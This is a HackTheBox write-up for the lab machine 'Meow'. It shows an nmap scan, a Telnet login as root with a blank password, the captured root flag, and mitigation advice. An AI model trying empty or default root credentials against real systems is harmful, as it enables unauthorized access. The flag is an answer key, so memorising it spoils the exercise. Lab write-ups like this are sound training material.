# Meow - HackTheBox Writeup

**Date:** 2026-03-29
**OS:** Linux
**IP Address:** 10.129.14.157
**Difficulty:** Very Easy
**Points:** 10

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Meow**. 

*   **Initial Access:** Direct login via Telnet (Port 23) using the `root` account with no password.
*   **Privilege Escalation:** No escalation was required as initial access provided root privileges immediately.
*   **Key Learning Points:** 
    * Identifying insecure legacy protocols like Telnet.
    * Checking for default or empty credentials on administrative accounts.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 23/tcp | telnet | Linux telnetd | Open and accessible without encryption. |

**Nmap Command:**
```bash
nmap -sC -sV -oN nmap/meow 10.129.14.157
```

## 2.2. Web Enumeration
**Strategy:** No web services were detected during the initial scan.

---

# 3. Initial Access (User & Root Flag)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Misconfigured Telnet service allowing login with no password.
*   **Vector:** Telnet login prompt.

## 3.2. Exploitation Path
The target machine was found to have port 23 (Telnet) open. Upon connecting, a login prompt for the "Meow" system was presented. Testing the `root` username with a blank password granted immediate access to the system with highest privileges.

**Payload/Tool:**
```bash
telnet 10.129.14.157
# Username: root
# Password: [ENTER]
```

**Root Flag:**
```bash
cat /root/flag.txt
# b40abdfe23665f766f9c61ecba8a4c19
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
Not required as the initial shell was already `root`.

---

# 5. Credentials & Loot

| Username | Password / Hash | Source |
| :--- | :--- | :--- |
| root | (blank) | Telnet Brute-force/Guessing |

---

# 6. Recommendations & Mitigation
1. **Disable Telnet:** Replace Telnet with SSH (Secure Shell) to ensure all communications are encrypted.
2. **Enforce Strong Passwords:** Ensure the `root` account and all other users have strong, unique passwords.
3. **Firewall Rules:** Restrict access to administrative services like Telnet/SSH to specific IP addresses.
